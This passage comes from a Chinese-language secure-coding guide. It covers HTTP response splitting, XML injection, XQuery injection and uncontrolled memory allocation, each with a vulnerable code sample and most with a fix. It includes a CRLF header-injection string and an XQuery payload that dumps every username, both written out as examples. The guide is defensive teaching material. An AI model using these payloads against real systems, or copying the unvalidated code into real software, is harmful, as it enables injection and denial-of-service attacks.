<p>攻击者可以在HTTP标头中包含未经验证的数据，从而指定浏览器提供的整个HTTP响应。 当HTTP请求包含意外的CR（回车，也由％0d或\ r给出）和LF（换行，也由％0a或\n给出）字符时，服务器可能会通过被解释为两个不同的HTTP响应（而不是一个）的输出流响应请求。 攻击者可以控制第二响应并发起攻击，例如跨站点脚本和缓存投毒攻击。</p>
<p>HTTP响应拆分漏洞可能在以下情况下存在：</p>
<p><em>数据通过不受信任的来源（最常见的是HTTP请求）进入Web应用程序。
</em>数据包含在发送给Web用户的HTTP响应标头中，未经验证是否包含恶意字符。</p>
<h1 id="_2">漏洞与风险</h1>
<p>HTTP标头中的CR和LF字符可能使攻击者控制其余应用程序打算发送的响应正文，还可以使攻击者创建完全在其控制下的其他响应。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<ul>
<li>视所有的输入为危险的数据，通过使用白名单等的受信输入验证策略来严格清洗输入数据。</li>
<li>使用并指明读取上游输出的下游设备能够处理的输出编码。</li>
<li>确保应用不会重复解码同一段输入。</li>
</ul>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<p>下面的代码片段从HTTP请求中读取<code>author</code>这一<code>weblog</code>项的作者名，并将它设置到HTTP回复中Cookie的头部里：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">author</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="n">AUTHOR_PARAM</span><span class="o">);</span>
<span class="o">...</span>
<span class="n">Cookie</span> <span class="n">cookie</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Cookie</span><span class="o">(</span><span class="s">"author"</span><span class="o">,</span> <span class="n">author</span><span class="o">);</span>
<span class="n">cookie</span><span class="o">.</span><span class="na">setMaxAge</span><span class="o">(</span><span class="n">cookieExpiration</span><span class="o">);</span>
<span class="n">response</span><span class="o">.</span><span class="na">addCookie</span><span class="o">(</span><span class="n">cookie</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>假设上述HTTP回复中Coockie头部被设置成一串包含标准字符数字的字符串，如“Jane Smith”，那么将会有像这样的HTTP回复：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span>HTTP/1.1 200 OK
...
Set-Cookie: author=Jane Smith
...
</pre></div>
</td></tr></table>
<p>然而，如果该段Cookie的值没有经过任何验证，那么只有当<code>AUTHOR_PARAM</code>中不包含CR或LF字符时，回复才会如上面般的和谐。攻击者往往会给出像这样的恶意字符串：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>Wiley Hacker\r\nHTTP/1.1 200 OK\r\n
</pre></div>
</td></tr></table>
<p>紧接着，HTTP回复将会被分割成如下形式的两段回复：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span>HTTP/1.1 200 OK
...
Set-Cookie: author=Wiley Hacker HTTP/1.1 200 OK
...
</pre></div>
</td></tr></table>
<h1 id="_7">参考资料</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE113">
<p>https://cwe.mitre.org/data/definitions/113.html <a class="footnote-backref" href="#fnref-CWE113" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP">
<p>https://www.owasp.org/index.php/Top_10-2017_A1-Injection <a class="footnote-backref" href="#fnref-OWASP" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1099">XML注入</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
<li><a href="#_7">漏洞代码修复示例</a></li>
</ul>
</li>
<li><a href="#_8">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>可拓展性标记语言（Extensible Markup Language, XML）是为了存储、结构化以及传输数据而设计的。因为其平台无关性、灵活性以及相对简单性，众多程序都用到了XML。XML拥有很高的通用性，正也因此，XML易遭受众多攻击，其中就包含了XML注入攻击。</p>
<h1 id="_2">漏洞与风险</h1>
<p>只要用户能够提供用于组成XML文档的数据，那么他就能够在数据中注入XML标签。XML的解析器会对这些标签进行解析，进而可能会对XML文档进行重写。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<ul>
<li>视所有的输入为危险的数据，通过使用白名单等的受信输入验证策略来严格清洗输入数据。</li>
<li>在进行输入数据验证的过程中，要把所有可能牵涉到的属性都考虑到，如长度、输入数据的类型、可接受的输入值的范围、输入信息不足或累赘、语法、字段间的一致性以及对商业规则的服从性。</li>
</ul>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<p>在这段缺陷代码中，客户端使用简单的字符串拼接操作来构造XML查询语句，并将结果发送到服务器。因为程序没有对输入数据进行任何的验证，这段代码存在遭受XML注入攻击的风险：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.BufferedOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">OnlineStore</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">createXMLStreamBad</span><span class="o">(</span><span class="kd">final</span> <span class="n">BufferedOutputStream</span> <span class="n">outStream</span><span class="o">,</span>
      <span class="kd">final</span> <span class="n">String</span> <span class="n">quantity</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">xmlString</span> <span class="o">=</span> <span class="s">"&lt;item&gt;\n&lt;description&gt;Widget&lt;/description&gt;\n"</span>
        <span class="o">+</span> <span class="s">"&lt;price&gt;500&lt;/price&gt;\n"</span> <span class="o">+</span> <span class="s">"&lt;quantity&gt;"</span> <span class="o">+</span> <span class="n">quantity</span>
        <span class="o">+</span> <span class="s">"&lt;/quantity&gt;&lt;/item&gt;"</span><span class="o">;</span>
    <span class="n">outStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">xmlString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
    <span class="n">outStream</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="_7">漏洞代码修复示例</h3>
<p>取决于特定的数据以及对数据进行处理的命令解释器（或解析器），必须要使用恰当的方法来清洗用户提供的输入数据。这段合规代码验证接收的数量是否是无符号的整型值：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.BufferedOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">OnlineStore</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">createXMLStream</span><span class="o">(</span><span class="kd">final</span> <span class="n">BufferedOutputStream</span> <span class="n">outStream</span><span class="o">,</span>
      <span class="kd">final</span> <span class="n">String</span> <span class="n">quantity</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">NumberFormatException</span> <span class="o">{</span>
    <span class="c1">// Write XML string only if quantity is an unsigned integer (count).</span>
    <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">parseUnsignedInt</span><span class="o">(</span><span class="n">quantity</span><span class="o">);</span>
    <span class="n">String</span> <span class="n">xmlString</span> <span class="o">=</span> <span class="s">"&lt;item&gt;\n&lt;description&gt;Widget&lt;/description&gt;\n"</span>
        <span class="o">+</span> <span class="s">"&lt;price&gt;500&lt;/price&gt;\n"</span> <span class="o">+</span> <span class="s">"&lt;quantity&gt;"</span> <span class="o">+</span> <span class="n">count</span> <span class="o">+</span> <span class="s">"&lt;/quantity&gt;&lt;/item&gt;"</span><span class="o">;</span>
    <span class="n">outStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">xmlString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
    <span class="n">outStream</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>用于检查XML是否存在注入风险的一个更常见的方法是使用文档类型定义（Document Type Definition, DTD）或模式来进行验证。为了避免把注入当作有效的XML数据，这个模式必须要严谨地进行定义。以下是一个适合用于验证XML文档的模式片段：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nt">&lt;xs:schema</span> <span class="na">xmlns:xs=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
<span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"item"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;xs:complexType&gt;</span>
    <span class="nt">&lt;xs:sequence&gt;</span>
      <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"description"</span> <span class="na">type=</span><span class="s">"xs:string"</span><span class="nt">/&gt;</span>
      <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"price"</span> <span class="na">type=</span><span class="s">"xs:decimal"</span><span class="nt">/&gt;</span>
      <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"quantity"</span> <span class="na">type=</span><span class="s">"xs:nonNegativeInteger"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/xs:sequence&gt;</span>
  <span class="nt">&lt;/xs:complexType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
<span class="nt">&lt;/xs:schema&gt;</span>
</pre></div>
</td></tr></table>
<p>当接收的XML文档可能存在被不受信输入篡改的可能性时，使用模式或DTD来验证XML将会极其的方便。如果XML字符串还没有被创建，那么在构造XML文档前先对输入数据进行清洗往往会有更好的效果：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.BufferedOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.StringReader</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.xml.XMLConstants</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.ParserConfigurationException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParser</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.transform.stream.StreamSource</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.validation.Schema</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.validation.SchemaFactory</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.xml.sax.InputSource</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.SAXException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.SAXParseException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.XMLReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.helpers.DefaultHandler</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">OnlineStore</span> <span class="o">{</span>

  <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">createXMLStream</span><span class="o">(</span><span class="kd">final</span> <span class="n">BufferedOutputStream</span> <span class="n">outStream</span><span class="o">,</span>
      <span class="kd">final</span> <span class="n">String</span> <span class="n">quantity</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">xmlString</span><span class="o">;</span>
    <span class="n">xmlString</span> <span class="o">=</span> <span class="s">"&lt;item&gt;\n&lt;description&gt;Widget&lt;/description&gt;\n"</span>
        <span class="o">+</span> <span class="s">"&lt;price&gt;500.0&lt;/price&gt;\n"</span> <span class="o">+</span> <span class="s">"&lt;quantity&gt;"</span> <span class="o">+</span> <span class="n">quantity</span>
        <span class="o">+</span> <span class="s">"&lt;/quantity&gt;&lt;/item&gt;"</span><span class="o">;</span>
    <span class="n">InputSource</span> <span class="n">xmlStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InputSource</span><span class="o">(</span><span class="k">new</span> <span class="n">StringReader</span><span class="o">(</span><span class="n">xmlString</span><span class="o">));</span>
    <span class="c1">// Build a validating SAX parser using our schema</span>
    <span class="n">SchemaFactory</span> <span class="n">sf</span> <span class="o">=</span> <span class="n">SchemaFactory</span>
        <span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">XMLConstants</span><span class="o">.</span><span class="na">W3C_XML_SCHEMA_NS_URI</span><span class="o">);</span>
    <span class="n">DefaultHandler</span> <span class="n">defHandler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DefaultHandler</span><span class="o">()</span> <span class="o">{</span>
      <span class="kd">public</span> <span class="kt">void</span> <span class="nf">warning</span><span class="o">(</span><span class="n">SAXParseException</span> <span class="n">s</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">SAXParseException</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="n">s</span><span class="o">;</span>
      <span class="o">}</span>
      <span class="kd">public</span> <span class="kt">void</span> <span class="nf">error</span><span class="o">(</span><span class="n">SAXParseException</span> <span class="n">s</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">SAXParseException</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="n">s</span><span class="o">;</span>
      <span class="o">}</span>
      <span class="kd">public</span> <span class="kt">void</span> <span class="nf">fatalError</span><span class="o">(</span><span class="n">SAXParseException</span> <span class="n">s</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">SAXParseException</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="n">s</span><span class="o">;</span>
      <span class="o">}</span>
    <span class="o">};</span>
    <span class="n">StreamSource</span> <span class="n">ss</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StreamSource</span><span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">"schema.xsd"</span><span class="o">));</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">Schema</span> <span class="n">schema</span> <span class="o">=</span> <span class="n">sf</span><span class="o">.</span><span class="na">newSchema</span><span class="o">(</span><span class="n">ss</span><span class="o">);</span>
      <span class="n">SAXParserFactory</span> <span class="n">spf</span> <span class="o">=</span> <span class="n">SAXParserFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
      <span class="n">spf</span><span class="o">.</span><span class="na">setSchema</span><span class="o">(</span><span class="n">schema</span><span class="o">);</span>
      <span class="n">SAXParser</span> <span class="n">saxParser</span> <span class="o">=</span> <span class="n">spf</span><span class="o">.</span><span class="na">newSAXParser</span><span class="o">();</span>
      <span class="c1">// To set the custom entity resolver,</span>
      <span class="c1">// an XML reader needs to be created</span>
      <span class="n">XMLReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="n">saxParser</span><span class="o">.</span><span class="na">getXMLReader</span><span class="o">();</span>
      <span class="n">reader</span><span class="o">.</span><span class="na">setEntityResolver</span><span class="o">(</span><span class="k">new</span> <span class="n">CustomResolver</span><span class="o">());</span>
      <span class="n">saxParser</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">xmlStream</span><span class="o">,</span> <span class="n">defHandler</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ParserConfigurationException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
      <span class="k">throw</span> <span class="k">new</span> <span class="n">IOException</span><span class="o">(</span><span class="s">"Unable to validate XML"</span><span class="o">,</span> <span class="n">x</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">SAXException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
      <span class="k">throw</span> <span class="k">new</span> <span class="n">IOException</span><span class="o">(</span><span class="s">"Invalid quantity"</span><span class="o">,</span> <span class="n">x</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="c1">// Our XML is valid, proceed</span>
    <span class="n">outStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">xmlString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
    <span class="n">outStream</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="_8">参考资料</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert">
<p>https://wiki.sei.cmu.edu/confluence/display/java/IDS16-J.+Prevent+XML+Injection <a class="footnote-backref" href="#fnref-cert" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1095">XQuery注入</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
</ul>
</li>
<li><a href="#_7">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>该软件没有或不恰当地中立化外部输入，并将输入用来动态构造用于从XML数据库中获取数据的XQuery表达式，这将使得攻击者能够控制查询语句的结构。</p>
<h1 id="_2">漏洞与风险</h1>
<p>该漏洞的最终效果是攻击者能过获得从XML数据库中取得的数据的控制权，并通过使用这一点来控制程序的执行流、修改程序逻辑、获取没有授权的数据或越过重要的安全检查（如认证）。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<ul>
<li>使用参数化的查询语句。</li>
<li>合理地验证用户输入。</li>
</ul>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<p>以下的例子展现了攻击者试图访问<code>accounts.xml</code>并请求服务提供者将所有的用户名返回：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>doc(accounts.xml)//user[Name='*']
</pre></div>
</td></tr></table>
<h1 id="_7">参考资料</h1>
<p>[^capec]： https://capec.mitre.org/data/definitions/84.html</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0088">不受控制的内存分配</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">缓解与预防</a></li>
<li><a href="#_4">漏洞利用威胁</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#1">漏洞代码示例 1</a></li>
<li><a href="#1_1">修复代码示例1</a></li>
<li><a href="#2">漏洞代码示例 2</a></li>
<li><a href="#2_1">修复代码示例2</a></li>
<li><a href="#3">漏洞代码示例3</a></li>
<li><a href="#3_1">修复代码示例3</a></li>
</ul>
</li>
<li><a href="#_6">引用</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>程序基于不可信的数值分配内存，但不验证或错误验证数值大小，导致允许分配任意数量的内存。</p>
<h1 id="_2">漏洞与风险</h1>
<p>不控制内存分配的大小可能导致请求太多的系统内存，从而导致应用程序由于内存不足而崩溃或消耗大量内存。</p>
<h1 id="_3">缓解与预防</h1>
<p>针对影响内存分配大小的任何数值要执行重复的输入验证。为处理超出限制的请求定义适当的策略，并考虑支持配置选项，以便管理员可以根据需要扩展要使用的内存量。</p>
<p>使用系统提供的内存资源限制运行程序。这可能仍会导致程序崩溃或退出，但对系统其余部分的影响将最小化。</p>
<h1 id="_4">漏洞利用威胁</h1>
<p>高危</p>
<h1 id="_5">演示实例</h1>
<h3 id="1">漏洞代码示例 1</h3>
<p>考虑下面的代码，它接受一个不可信的大小值并分配一个缓冲区来包含给定大小的字符串。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">GetUntrustedInt</span><span class="p">();</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">totBytes</span> <span class="o">=</span> <span class="n">size</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">);</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">string</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">totBytes</span><span class="p">);</span>
<span class="n">InitializeString</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
</pre></div>
</td></tr></table>
<p>假设攻击者提供的大小值为 12345678, 这将导致为字符串分配305,419,896字节（超过291兆字节）。</p>
<h3 id="1_1">修复代码示例1</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">GetUntrustedInt</span><span class="p">();</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">totBytes</span> <span class="o">=</span> <span class="n">size</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">);</span>

<span class="c1">// 确保输入的内存大小是合理的</span>
<span class="k">if</span> <span class="p">(</span><span class="n">totBytes</span> <span class="o">&gt;</span> <span class="mi">100000000</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Out of memory!!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
 <span class="n">error_handler</span><span class="p">();</span>
 <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">char</span> <span class="o">*</span><span class="n">string</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">totBytes</span><span class="p">);</span>
<span class="n">InitializeString</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
</pre></div>
</td></tr></table>
<h3 id="2">漏洞代码示例 2</h3>
<p>考虑下面的代码，该代码接受不可信的大小值并将大小作为HashMap的初始容量。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">GetUntrustedInt</span><span class="p">();</span>
<span class="n">HashMap</span> <span class="n">list</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
</pre></div>
</td></tr></table>
<p>HashMap构造函数将验证初始容量不是负数，但是没有检查来验证是否存在足够的内存。如果攻击者提供足够大的值，则应用程序将运行到OutOfMemoryError。</p>
<h3 id="2_1">修复代码示例2</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">GetUntrustedInt</span><span class="p">();</span>

<span class="c1">// 确保输入的内存大小是合理的</span>
<span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mi">10000000</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Out of memory!!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
 <span class="n">error_handler</span><span class="p">();</span>
 <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">HashMap</span> <span class="n">list</span> <span class="o">=</span> <span class="n">new</span> <span class="n">HashMap</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
</pre></div>
</td></tr></table>
<h3 id="3">漏洞代码示例3</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">example_fun</span><span class="p">(</span><span class="kt">int</span> <span class="n">length</span><span class="p">)</span>  <span class="c1">//length为用户的输入数据</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="n">length</span><span class="o">&lt;=</span><span class="mi">0</span><span class="p">)</span>  <span class="c1">//没有验证length是否超出内存分配的上限</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">length</span><span class="p">);</span>
    <span class="p">...</span>
    <span class="n">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
    <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<h3 id="3_1">修复代码示例3</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">const</span> <span class="kt">int</span> <span class="n">MAX_LENGTH</span> <span class="o">=</span> <span class="mi">1024</span><span class="p">;</span>  <span class="c1">//指定内存分配的上限或动态判断剩余内存大小自动分配</span>
<span class="kt">void</span> <span class="nf">example_fun</span><span class="p">(</span><span class="kt">int</span> <span class="n">length</span><span class="p">)</span>  <span class="c1">//length为用户的输入数据</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
